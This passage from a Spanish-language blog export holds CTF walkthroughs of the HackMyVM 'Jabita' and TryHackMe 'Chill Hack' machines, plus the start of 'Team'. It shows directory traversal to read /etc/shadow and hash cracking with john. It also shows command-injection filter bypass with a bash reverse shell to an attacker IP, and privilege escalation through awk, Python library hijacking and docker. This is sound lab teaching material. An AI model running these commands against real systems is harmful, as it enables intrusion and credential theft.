â”‚ 2 â”‚ [*] Extracting information... 3 â”‚ 4 â”‚ [*] IP Address: 192.168.1.141 5 â”‚ [*] Open ports: 22,80 6 â”‚ 7 â”‚ [*] Ports copied to clipboard 8 â”‚ â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts bÃ¡sicos de reconocimientos\n$ nmap -p21,22,80 -sC -sV 192.168.1.141 -oN versions PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 00b003d392f8a0f95a93207bf80aaada (ECDSA) |_ 256 ddb4261d0ce738c37a2f07bef8743ebc (ED25519) 80/tcp open http Apache httpd 2.4.52 ((Ubuntu)) |_http-title: Site doesn\u0026#39;t have a title (text/html). |_http-server-header: Apache/2.4.52 (Ubuntu) ParÃ¡metro FunciÃ³n -p Especificamos los puertos abiertos que hemos encontrado con el escaneo anterior -sC Para que realice scripts bÃ¡sicos de reconocimiento -sV Proporciona la versiÃ³n e informaciÃ³n de los servicios que corren por los puertos Web EstÃ¡ corriendo una web por el puerto 80\nSegÃºn el mensaje podemos intuir que como estÃ¡ en proceso de construcciÃ³n no va a estar muy bien echa\nFuzzing subdirectorios Vamos a buscar subdirectorios con gobuster con el diccionario /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\nâ¯ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.1.141 /building (Status: 301) [Size: 317] [--\u0026gt; http://192.168.1.141/building/] Nos ha encontrado un subdirectorio\nAl entrar si nos fijamos en la url vemos como hay un \u0026lsquo;?page=archivo\u0026rsquo;\nEn este caso lo que se puede probar es si es vulnerable a directory traversal\nEfectivamente, es vulnerable, viendo el /etc/passwd podemos ver 2 usuarios\njaba jack DespuÃ©s de ir probando varias cosas he encontrado que podemos ver el archivo /etc/shadow\nRÃ¡pidamente podemos ver que el hash de jack es un sha512 porque empieza por \u0026lsquo;$6$\u0026rsquo;, Nos lo copiamos y lo guardamos en un archivo en nuestra mÃ¡quina llamado hash, despuÃ©s con john de ripper y el diccionario rockyou.txt vamos a intentar encontrar la contraseÃ±a\njohn --wordlist=/usr/share/wordlists/rockyou.txt hash john --show hash Ahora ya nos podemos conectar por ssh como jack\nEscalada de privilegios Jaba Con un sudo -l vemos que podemos ejecutar awk como jaba\njack@jabita:~$ sudo -l Matching Defaults entries for jack on jabita: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty, listpw=never User jack may run the following commands on jabita: (jaba : jaba) NOPASSWD: /usr/bin/awk Haciendo una bÃºsqueda por la web de gtfobins encontramos que con el siguiente comando podemos escalar privilegios\nsudo -u jaba /usr/bin/awk \u0026#39;BEGIN {system(\u0026#34;/bin/bash\u0026#34;)}\u0026#39; Ya podemos ver la flag en /home/jaba/user.txt\nRoot con sudo -l vemos que podemos ejecutar un archivo de python llamado clean.py\nMatching Defaults entries for jaba on jabita: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty, listpw=never User jaba may run the following commands on jabita: (root) NOPASSWD: /usr/bin/python3 /usr/bin/clean.py Con un cat a /usr/bin/clean.py vemos que el progrma importa una libreria llamada wild y ejecuta la funcion first de la libreria wild\njaba@jabita:~$ cat /usr/bin/clean.py import wild wild.first() Para encontrar donde estÃ¡ el wild.py vamos a usar find\njaba@jabita:~$ find / -name wild.py 2\u0026gt;/dev/null /usr/lib/python3.10/wild.py Tenemos permisos de escritura\njaba@jabita:~$ ls -l /usr/lib/python3.10/wild.py -rw-r--rw- 1 root root 42 Mar 6 17:28 /usr/lib/python3.10/wild.py Vamos a modificarlo de tal forma que quede asÃ­\nimport os def first(): os.system(\u0026#34;bash\u0026#34;) Importamos la libreria os, definimos la funciÃ³n first y dentro de la funciÃ³n first ponemos que ejecute bash, como estamos ejecutando el programa como root nos va a spawnear una bash como root\njaba@jabita:~$ sudo /usr/bin/python3 /usr/bin/clean.py root@jabita:/home/jaba# id uid=0(root) gid=0(root) groups=0(root) root@jabita:/home/jaba# Ya somos root!\nPodemos ver la flag en /root/root.txt\n","date":"2023-03-06","id":77,"permalink":"/writeups/hackmyvm/jabita/","summary":"https://hackmyvm.eu/machines/machine.php?vm=Jabita\nIP Atacante = 192.168.1.138\nIP vÃ­ctima = 192.168.1.141\nReconocimiento Para empezar lo primero es comprobar si la mÃ¡quina estÃ¡ activa y que OS tiene","tags":["CTF","FÃ¡cil","Linux","Directory Traversal","python","awk"],"title":"Jabita"},{"content":"","date":"2023-03-06","id":78,"permalink":"/tags/linux/","summary":"","tags":[],"title":"Linux"},{"content":"https://tryhackme.com/room/chillhack\nIP Atacante = 10.10.10.10\nIP vÃ­ctima = 10.10.11.182\nReconocimiento Para empezar lo primero es comprobar si la mÃ¡quina estÃ¡ activa y que OS tiene\n$ ping -c 1 10.10.11.182 PING 10.10.11.182 (10.10.11.182) 56(84) bytes of data. 64 bytes from 10.10.11.182: icmp_seq=1 ttl=61 time=558 ms --- 10.10.11.182 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 558.208/558.208/558.208/0.000 ms En este caso da un ttl (time to live) de 61, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta mÃ¡quina es Linux por aproximaciÃ³n\nEscaneo de puertos (nmap) Ahora empezamos con un escaneo de puertos\nsudo nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.11.182 -oG allPorts ParÃ¡metro FunciÃ³n -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resoluciÃ³n DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Skip host discovery -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una funciÃ³n definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma mÃ¡s visual\nFunciÃ³n extractPorts de @s4vitar\n$ extractPorts allPorts â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ â”‚ File: extractPorts.tmp â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ 1 â”‚ 2 â”‚ [*] Extracting information... 3 â”‚ 4 â”‚ [*] IP Address: 10.10.11.182 5 â”‚ [*] Open ports: 21,22,80 6 â”‚ 7 â”‚ [*] Ports copied to clipboard 8 â”‚ â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts bÃ¡sicos de reconocimientos\n$ nmap -p21,22,80 -sC -sV 10.10.11.182 -oN versions Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-01 19:15 CET Nmap scan report for photobomb.htb (10.10.11.182) Host is up (0.29s latency). PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.2.28.215 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 3 | vsFTPd 3.0.3 - secure, fast, stable |_End of status | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_-rw-r--r-- 1 1001 1001 90 Oct 03 2020 note.txt 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 09f95db918d0b23a822d6e768cc20144 (RSA) | 256 1bcf3a498b1b20b02c6aa551a88f1e62 (ECDSA) |_ 256 3005cc52c66f6504860f7241c8a439cf (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-title: Game Info |_http-server-header: Apache/2.4.29 (Ubuntu) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel ParÃ¡metro FunciÃ³n -p Especificamos los puertos abiertos que hemos encontrado con el escaneo anterior -sC Para que realice scripts bÃ¡sicos de reconocimiento -sV Proporciona la versiÃ³n e informaciÃ³n de los servicios que corren por los puertos FTP Lo primero que nos reporta nmap es que el usuario anonymous estÃ¡ permitido y hay un archivo llamado note.txt.\n$ ftp 10.10.11.182 # Nos conectamos por ftp Connected to 10.10.11.182. 220 (vsFTPd 3.0.3) Name (10.10.11.182:d3b0o): anonymous # Con el usuario anonymous 331 Please specify the password. Password: # Sin contraseÃ±a 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls 229 Entering Extended Passive Mode (|||8911|) 150 Here comes the directory listing. -rw-r--r-- 1 1001 1001 90 Oct 03 2020 note.txt 226 Directory send OK. ftp\u0026gt; get note.txt # Nos lo pasamos a nuestra mÃ¡quina local: note.txt remote: note.txt 229 Entering Extended Passive Mode (|||15616|) 150 Opening BINARY mode data connection for note.txt (90 bytes). 100% |*****************************************************************************| 90 28.28 KiB/s 00:00 ETA 226 Transfer complete. 90 bytes received in 00:00 (0.29 KiB/s) Contenido de el archivo note.txt\nAnurodh told me that there is some filtering on strings being put in the command \u0026ndash; Apaar\nDe esta nota podemos sacar 2 posibles usuarios\nApaar Anurodh HTTP Subdirectorios Para encontrar subdirectorios vamos a usar la herramienta gobuster con el siguiente comando\n$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.11.182/ /images (Status: 301) [Size: 313] [--\u0026gt; http://10.10.11.182/images/] /css (Status: 301) [Size: 310] [--\u0026gt; http://10.10.11.182/css/] /js (Status: 301) [Size: 309] [--\u0026gt; http://10.10.11.182/js/] /fonts (Status: 301) [Size: 312] [--\u0026gt; http://10.10.11.182/fonts/] /secret (Status: 301) [Size: 313] [--\u0026gt; http://10.10.11.182/secret/] Hay un subdirectorio que a simple vista llama la atenciÃ³n /secret\nAl entrar vemos que podemos ejecutar comandos.\nProbando comandos podemos ver que hay algunos que los bloquea\u0026hellip;\nIntrusiÃ³n Al poner un comando vÃ¡lido, como por ejemplo pwd, \u0026ldquo;;\u0026rdquo; y un comando bloqueado, nos ejecuta los 2.\nDe tal forma que quedarÃ­a asÃ­: pwd;ls\nOtra opciÃ³n serÃ­a poner \u0026ldquo;\\\u0026rdquo; antes del comando, porejemplo \\ls\nAhora lo que vamos a hacer es mandarnos una reverse shell desde la mÃ¡quina vÃ­ctima a la nuestra.\nLo primero va a ser ponerse en escucha por el puerto 443 con nc\nnc -nlvp 443 Y despuÃ©s vamos a mandar desde la web el siguiente comando:\n# Puerto pwd;bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.10.10/443 0\u0026gt;\u0026amp;1\u0026#34; # IP Atacante Recibimos la reverse shell!\n$ nc -nlvp 443 listening on [any] 443 ... connect to [10.2.28.215] from (UNKNOWN) [10.10.11.182] 57032 bash: cannot set terminal process group (1022): Inappropriate ioctl for device bash: no job control in this shell www-data@ubuntu:/var/www/html/secret$ Con un ip a podemos comprobar que estamos en la 10.10.11.182\nwww-data@ubuntu:/var/www/html/secret$ ip a ip a 1: lo: \u0026lt;LOOPBACK,UP,LOWER_UP\u0026gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever 2: eth0: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 9001 qdisc fq_codel state UP group default qlen 1000 link/ether 02:36:f5:10:cb:37 brd ff:ff:ff:ff:ff:ff inet 10.10.11.182/16 brd 10.10.255.255 scope global dynamic eth0 valid_lft 3363sec preferred_lft 3363sec inet6 fe80::36:f5ff:fe10:cb37/64 scope link valid_lft forever preferred_lft forever Tratamiento de la tty Antes de nada para trabajar mejor vamos a hacer un tratamiento de la terminal con los siguientes comandos:\nscript /dev/null -c bash ctrl + z\nstty raw -echo; fg reset xterm export SHELL=bash export TERM=xterm Escalada de privilegios Apaar Con un sudo -l vemos que podemos ejecutar el archivo .helpline.sh que estÃ¡ en el /home/apaar/ como apaar\nwww-data@ubuntu:/var/www/html/secret$ sudo -l Matching Defaults entries for www-data on ubuntu: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User www-data may run the following commands on ubuntu: (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh www-data@ubuntu:/var/www/html/secret$ Antes de nada vamos a ver el contenido del ese archivo\n#!/bin/bash echo echo \u0026#34;Welcome to helpdesk. Feel free to talk to anyone at any time!\u0026#34; echo read -p \u0026#34;Enter the person whom you want to talk with: \u0026#34; person read -p \u0026#34;Hello user! I am $person, Please enter your message: \u0026#34; msg $msg 2\u0026gt;/dev/null echo \u0026#34;Thank you for your precious time!\u0026#34; Es un programa muy simple, en el segundo input guarda la respuesta en una variable llamada msg y la ejecuta\u0026hellip;\nwww-data@ubuntu:/var/www/html/secret$ sudo -u apaar /home/apaar/.helpline.sh Welcome to helpdesk. Feel free to talk to anyone at any time! Enter the person whom you want to talk with: test Hello user! I am test, Please enter your message: bash whoami apaar Para que nos salga el prompt y nos funcione el ctrl + l, etc\u0026hellip; podemos poner el siguiente comando\nscript /dev/null -c bash Anurodh mysql (rabbit hole) Para la escalada vamos a usar la herramienta https://linpeas.sh/ que es un script que automatiza el proceso de la escalada de privilegios\nPrimero nos lo pasamos a nuestra mÃ¡quina\nDespuÃ©s nos montamos un servidor con python por el puerto 80\nsudo python3 -m http.server 80 Desde la mÃ¡quina vÃ­ctima en el directorio /tmp nos pasamos el archivo.\nwget http://10.10.10.10/linpeas.sh Le damos permisos de ejecuciÃ³n con chmod\nchmod +x linpeas.sh Y lo ejecutamos ./linpeas.sh\nReporta que hay 2 puertos que solo son visibles desde el localhost\ntcp 0 0 127.0.0.1:9001 0.0.0.0:* LISTEN tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN Esto lo podrÃ­amos haber encontrado tambÃ­en con:\napaar@ubuntu:/tmp$ (netstat -punta || ss --ntpu) | grep \u0026#34;127.0\u0026#34; (No info could be read for \u0026#34;-p\u0026#34;: geteuid()=1001 but you should be root.) tcp 0 0 127.0.0.1:9001 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN - udp 0 0 127.0.0.53:53 0.0.0.0:* - El puerto 3306 es el puerto predeterminado de mysql\nDentro del directorio /var/www/files hay un archivo llamado index.php en el cual hay unas credenciales para mysql\nLas cuales podemos usar para conectarnos\napaar@ubuntu:/var/www/files$ mysql -u root -p Enter password: mysql\u0026gt; Primero listamos las bases de datos\nmysql\u0026gt; show databases; +--------------------+ | Database | +--------------------+ | information_schema | | mysql | | performance_schema | | sys | | webportal | +--------------------+ 5 rows in set (0.00 sec) DespuÃ©s listamos las tablas de la base de datos webportal\nmysql\u0026gt; show tables from webportal; +---------------------+ | Tables_in_webportal | +---------------------+ | users | +---------------------+ 1 row in set (0.00 sec) Por Ãºltimo vemos el contenido de la tabla\nmysql\u0026gt; use webportal mysql\u0026gt; select * from users; +----+-----------+----------+-----------+----------------------------------+ | id | firstname | lastname | username | password | +----+-----------+----------+-----------+----------------------------------+ | 1 | Anurodh | Acharya | Aurick | 7e53614ced3640d5de23f111806cc4fd | | 2 | Apaar | Dahal | cullapaar | 686216240e5af30df0501e53c789a649 | +----+-----------+----------+-----------+----------------------------------+ 2 rows in set (0.00 sec) Podemos ver que estÃ¡ el hash de dos usuarios\nCon hash-identifier buscamos que tipo es\n$ hash-identifier 7e53614ced3640d5de23f111806cc4fd Possible Hashs: [+] MD5 Vamos a guardar cada uno en un archivo (hash1, hash2) y usando john con el diccionario rockyou vamos a intentar encontrar la contraseÃ±a\njohn --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash1 john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash2 Parece que era una trampa porque no sirven para nada :)\nSteganography Dentro del directorio /var/www/files hay un archivo llamado hacker.php el cual llama la atenciÃ³n\nDentro del hacker.php:\n\u0026lt;img src = \u0026#34;images/hacker-with-laptop_23-2147985341.jpg\u0026#34;\u0026gt;\u0026lt;br\u0026gt; \u0026lt;h1 style=\u0026#34;background-color:red;\u0026#34;\u0026gt;You have reached this far. \u0026lt;/h2\u0026gt; \u0026lt;h1 style=\u0026#34;background-color:black;\u0026#34;\u0026gt;Look in the dark! You will find your answer\u0026lt;/h1\u0026gt; Hay un mensaje que dice: Has llegado muy lejos, Mira en la oscuridad y econtraras la respuesta\nArriba del mensaje hay una foto, la cual puede ser que tenga algo\nPara pasarla a nuestra mÃ¡quina vamos a abrirnos un servidor con python desde la mÃ¡quina vÃ­ctima\npython3 -m http.server Y desde nuestra mÃ¡quina nos la bajamos\nwget http://10.10.11.182:8000/hacker-with-laptop_23-2147985341.jpg Para ver si tiene algo oculto vamos a usar la herramienta steghide\nsteghide extract -sf hacker-with-laptop_23-2147985341.jpg La imagen contenia un backup.zip\nEl backup.zip estÃ¡ protegido con una contraseÃ±a, lo que vamos a hacer es sacarle el hash y despuÃ©s intentar romperlo con john mediante el diccionario rockyou.txt\nzip2john backup.zip \u0026gt; hash john --wordlist=/usr/share/wordlists/rockyou.txt hash john --show hash Ahora ya tenmos la contraseÃ±a y lo podemos descomprimir.\nDentro hay un php en el cual en una lÃ­nea podemos ver que hay una condiciÃ³n con un base64\nif(base64_encode($password) == \u0026#34;IWQwbnRLbjB3bVlwQHNzdzByZA==\u0026#34;) Podemos descifrarlo con:\necho \u0026#34;IWQwbnRLbjB3bVlwQHNzdzByZA==\u0026#34; | base64 -d El resultado es la contraseÃ±a del usuario anurodh\nRoot Al hacer un id vemos que pertenecemos al grupo de docker\nanurodh@ubuntu:/var/www/files/images$ id uid=1002(anurodh) gid=1002(anurodh) groups=1002(anurodh),999(docker) Echando un ojo al gtfobins podemos ver que hay un comando para escalar privilegios con docker\ndocker run -v /:/mnt --rm -it alpine chroot /mnt sh Ya somos root :)\n","date":"2023-03-01","id":79,"permalink":"/writeups/tryhackme/chill-hack/","summary":"https://tryhackme.com/room/chillhack\nIP Atacante = 10.10.10.10\nIP vÃ­ctima = 10.10.11.182\nReconocimiento Para empezar lo primero es comprobar si la mÃ¡quina estÃ¡ activa y que OS tiene","tags":["CTF","FÃ¡cil","Linux","Steganography","mysql","zip2john","docker"],"title":"Chill Hack"},{"content":"","date":"2023-03-01","id":80,"permalink":"/tags/mysql/","summary":"","tags":[],"title":"mysql"},{"content":"","date":"2023-03-01","id":81,"permalink":"/tags/steganography/","summary":"","tags":[],"title":"Steganography"},{"content":"","date":"2023-03-01","id":82,"permalink":"/tags/zip2john/","summary":"","tags":[],"title":"zip2john"},{"content":"","date":"2023-02-09","id":83,"permalink":"/tags/cronjob/","summary":"","tags":[],"title":"cronjob"},{"content":"","date":"2023-02-09","id":84,"permalink":"/tags/fuzzing/","summary":"","tags":[],"title":"Fuzzing"},{"content":"https://tryhackme.com/room/teamcw\nIP Atacante = 10.10.10.10\nIP VÃ­ctima = 10.10.67.245\nReconocimiento Para empezar lo primero es comprobar si la mÃ¡quina estÃ¡ activa y que OS tiene\n$ ping -c 1 10.10.67.245 PING 10.10.67.245 (10.10.67.245) 56(84) bytes of data. 64 bytes from 10.10.67.245: icmp_seq=1 ttl=63 time=49.5 ms --- 10.10.67.245 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 49.502/49.502/49.502/0.000 ms En este caso da un ttl (time to live) de 63, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta mÃ¡quina es Linux por aproximaciÃ³n\nEscaneo de puertos (nmap) Ahora empezamos con un escaneo de puertos\nsudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.67.245 -oG allports ParÃ¡metro FunciÃ³n -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resoluciÃ³n DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Skip host discovery -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una funciÃ³n definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma mÃ¡s visual\nFunciÃ³n extractPorts de @s4vitar\nâ¯ extractPorts allPorts â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ â”‚ File: extractPorts.tmp â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ 1 â”‚ 2 â”‚ [*] Extracting information... 3 â”‚ 4 â”‚ [*] IP Address: 10.10.67.245 5 â”‚ [*] Open ports: 21,22,80 6 â”‚ 7 â”‚ [*] Ports copied to clipboard 8 â”‚ â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts bÃ¡sicos de reconocimientos\n$ nmap -p21,22,80 -sC -sV 10.10.67.245 -oN versions PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 795f116aa85c20824306cd488741b794d (RSA) | 256 af7e3aaf7eb4865883f1f6a254a69bbaad (ECDSA) |_ 256 2625ba07bdc3fb29437125dcd0698c79f (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works! If you see this add \u0026#39;te... Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Whatweb Ejecutamos un whatweb para ver mÃ¡s informaciÃ³n sobre la web\n$ whatweb 10.10.67.245 http://10.10.67.245 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.67.245], Title[Apache2 Ubuntu Default Page: It works! If you see this add \u0026#39;team.thm\u0026#39; to your hosts!] En el titulo pone que hay que aÃ±adir team.thm en el /etc/hosts\nWeb team.thm Reconocimiento wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://team.thm/FUZZ 000000291: 301 9 L 28 W 305 Ch \u0026#34;assets\u0026#34; 000000274: 301 9 L 28 W 306 Ch \u0026#34;scripts\u0026#34; 000000016: 301 9 L 28 W 305 Ch \u0026#34;images\u0026#34; Volvemos a hacer el escaneo sobre el directorio scripts con el diccionario SecLists/Discovery/Web-Content/raft-medium-words-lowercase.txt\n$ wfuzz -c -t 200 --hc=404,403 -w /opt/SecLists/Discovery/Web-Content/raft-medium-words-lowercase.txt \u0026#34;http://team.thm/scripts/FUZZ.txt\u0026#34; 000000297: 200 21 L 71 W 597 Ch \u0026#34;script\u0026#34; Contenido del script.txt\n#!/bin/bash read -p \u0026#34;Enter Username: \u0026#34; REDACTED read -sp \u0026#34;Enter Username Password: \u0026#34; REDACTED echo ftp_server=\u0026#34;localhost\u0026#34; ftp_username=\u0026#34;$Username\u0026#34; ftp_password=\u0026#34;$Password\u0026#34; mkdir /home/username/linux/source_folder source_folder=\u0026#34;/home/username/source_folder/\u0026#34; cp -avr config* $source_folder dest_folder=\u0026#34;/home/username/linux/dest_folder/\u0026#34; ftp -in $ftp_server \u0026lt;\u0026lt;END_SCRIPT quote USER $ftp_username quote PASS $decrypt cd $source_folder !cd $dest_folder mget -R * quit # Updated version of the script # Note to self had to change the extension of the old \u0026#34;script\u0026#34; in this folder, as it has creds in Al final vemos que hay una nota que dice que tuvieron que cambiar la extensiÃ³n del script antiguo porque tenÃ­a CREDENCIALES\nVamos a hacer fuzzing con wfuzz usando un diccionario de extensiones.\n$ wfuzz -c -t 200 --hc=404,403 -w /opt/SecLists/Fuzzing/extensions-skipfish.fuzz.txt \u0026#34;http://team.thm/scripts/script.FUZZ\u0026#34; 000000086: 200 21 L 71 W 597 Ch \u0026#34;txt\u0026#34; 000000053: 200 18 L 44 W 466 Ch \u0026#34;old\u0026#34; Ya tenemos la extensiÃ³n del antiguo script. Si lo abrimos vemos las credenciales del usuario ftpuser\nFtp Nos conectamos por ftp como ftpuser. Dentro vemos que hay un archivo que se llama New_site.txt que nos lo podemos bajar a nuestra mÃ¡quina con un get get New_site.txt para ver su contenido\nEl contenido del archivo es un mensaje dirijido de gyles a dale en el cual se dice que estÃ¡n empezando a programar una nueva web en un subdominio llamado dev y tambiÃ©n dice que hay una copia del id_rsa en el archivo de configuraciÃ³n del ssh\nEsto lo podrÃ­amos haber encontrado antes con gobuster:\n$ gobuster vhost -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u team.thm -t 50 --append-domain Found: dev.team.thm Status: 200 [Size: 187] Subdominio dev.team.thm Antes que nada es importante aÃ±adir el subdominio dev al /etc/hosts\nAl entrar a http://dev.team.thm/ vemos que hay un link a http://dev.team.thm/script.php?page=teamshare.php viendo la url podemos ver que a lo mejor podemos hacer Directory Traversal Que consiste en salir del directorio y poder ver archivos del servidor\nAl probar de ir a http://dev.team.thm/script.php?page=../../../../etc/passwd Vemos que nos muestra el /etc/passwd\nSi recordamos lo que ponÃ­a en la nota de ftp, habÃ­a 